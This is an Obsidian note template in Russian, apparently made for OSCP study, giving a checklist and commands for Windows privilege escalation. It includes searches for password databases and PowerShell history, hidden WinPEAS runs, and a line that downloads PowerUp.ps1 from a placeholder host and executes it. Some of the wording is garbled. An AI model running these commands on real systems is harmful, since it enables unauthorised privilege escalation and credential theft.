---
icon: 🗒
target:
- ""
createdAt: "{{DATE}}"
imageNameKey: nota_<% tp.file.title.split(" ").join("_").toLowerCase() %>
tags: 
NoteRel:
---
## Чек-лист выдергивания привилегий на локальном компьютере
- [ ] Имя пользователя, имя хоста и привилегии
- [ ] Участие в группах текущего пользователя
- [ ] Существующие пользователи и группы
- [ ] Операционная система, версия, архитектура и обновления безопасности
- [ ] Информация о сети
- [ ] Установленные приложения x64 и x86
- [ ] Запущенные процессы
- [ ] Поиск конфиденциальных файлов
- [ ] История и трансляция PowerShell
- [ ] Переменные окружения PowerShell
- [ ]计划ed задачи
- [ ] Запущенные сервисы

## Чек-лист привилегий
- [ ] Уязвимости установленного программного обеспечения
- [ ] Planeded задачи
- [ ] Запущенные сервисы
- [ ] WinPeas
- [ ] Bloodhound
- [ ] Hijacking DLL
- [ ] winlogon
- [ ] putty

## Ссылки
[Windows Privilege Escalation – Situation Awareness](obsidian://open?vault=OSCP-Study-Notes&file=Windows%20Privilege%20Escalation%2FSituational%20Awareness)
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration

## Инициализация инструментов автоматизации

### Winpeas
> cmd
```cmd
wmic process call create "cmd.exe /c C:\temp\winpeas.exe > C:\temp\winpeas.txt"
```

>powershell
```powershell
Start-Process -FilePath "C:\temp\winpeas.exe" -ArgumentList " > C:\temp\output.txt" -WindowStyle Hidden -NoNewWindow

Start-Process -FilePath "C:\temp\winpeas.exe" -RedirectStandardOutput "C:\temp\winpeas.txt" -WindowStyle Hidden
```

### Powerup
```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/wintools/PowerUp.ps1'); Invoke-AllChecks"
```

# Выдергивание привилегий для (ИМЯ ПОЛЬЩЕКА)
## имя хоста и имя пользователя
```js
whoami
имя хоста

```

## Привилегии пользователя
```js
whoami /priv

```

## Участие в группах
```js
whoami /groups

```

## Конфиденциальные файлы по пользователю и группе
```js
Get-ChildItem -Path C:\ -Include *.kdbx,*.txt -File -Recurse -ErrorAction SilentlyContinue
```

```js
Get-ChildItem -Path C:\users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

## История и трансляция PowerShell
```js
Get-History

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHosthistory.txt

cat (Get-PSReadlineOption).HistorySavePath
```

## Переменные окружения PowerShell
```js
Get-ChildItem Env: | ft Key,Value
```

## Find-LocalAdmins
```js
Find-LocalAdmins
```

## Запущенные сервисы
- Найти сервисы, использующие исполняемые файлы, у которых есть доступные привилегии
- Найти сервисы, находящиеся в директориях, у которых есть доступные привилегии
- Использовать PowerUp.ps1 для автоматизации процесса и ручного выполнения
```js
net start
sc query
```

## Planeded задачи
- Найти задачи, у которых PathName с пробелом, но без скобок
- Найти задачи, у которых есть доступ к исполняемому файлу
- Найти задачи, у которых файл находится в директории с доступными привилегиями
- Использовать powerup.ps1 для автоматизации
```js
schtasks /query /fo LIST 2>nul | findstr TaskName

schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```



# Выдергивание системы 
## Существующие пользователи и группы

### Пользователи
```js
net user
```

### Группы
```js
net localgroup
Get-LocalGroup
```

## Операционная система, версия, архитектура
```js
systeminfo
```

## Установленные обновления безопасности
```js
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

```

## Информация о сети
```js
ipconfig /all

```

```js
route print

```
## Установленные приложения
#### Приложения x86
```js
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
#### Приложения x64
```js
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

```

## Запущенные процессы
```js
Get-Process
```

## Hijacking DLL
- Если возможно, скачать исполняемый файл программы и локально найти уязвимые DLL
- Найти файлы журналов программ
- Найти название программы в интернете и определить известные DLL hijacking

```
